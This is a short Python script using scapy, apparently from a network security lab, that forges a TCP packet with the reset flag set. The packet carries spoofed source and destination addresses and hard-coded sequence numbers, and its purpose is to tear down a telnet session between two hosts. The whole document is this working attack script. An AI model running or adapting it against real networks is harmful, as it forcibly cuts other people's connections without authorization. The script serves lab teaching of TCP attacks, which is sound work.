#!/usr/bin/python
from scapy.all import *
ip = IP(src="10.0.2.5", dst="10.0.2.6")
tcp = TCP(sport=37016,dport=23,flags="RA",seq=106433821, ack=662118569)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)